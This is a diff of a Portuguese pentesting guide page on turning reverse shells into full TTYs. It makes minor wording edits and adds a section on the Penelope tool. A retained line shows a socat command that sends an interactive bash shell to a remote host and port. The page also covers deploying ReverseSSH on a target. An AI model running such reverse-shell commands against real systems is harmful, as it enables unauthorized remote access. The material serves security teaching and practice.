@@ -17,7 +17,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 ## Full TTY
 
-Note que o shell que você definir na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `O valor da variável SHELL não foi encontrado no arquivo /etc/shells Este incidente foi relatado`. Além disso, note que os próximos trechos funcionam apenas no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.
+Note que o shell que você definir na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `O valor para a variável SHELL não foi encontrado no arquivo /etc/shells Este incidente foi relatado`. Além disso, note que os próximos trechos funcionam apenas no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.
 
 #### Python
 
@@ -67,7 +67,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Uma maneira conveniente de **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
+Uma maneira conveniente para **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
 
 Abaixo está um exemplo para `x86` com binários comprimidos com upx. Para outros binários, verifique a [página de lançamentos](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -112,6 +112,12 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) atualiza automaticamente shells reversas do Linux para TTY, gerencia o tamanho do terminal, registra tudo e muito mais. Também fornece suporte a readline para shells do Windows.
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## Sem TTY
 
 Se por algum motivo você não conseguir obter um TTY completo, você **ainda pode interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para `sudo` para ler um arquivo:
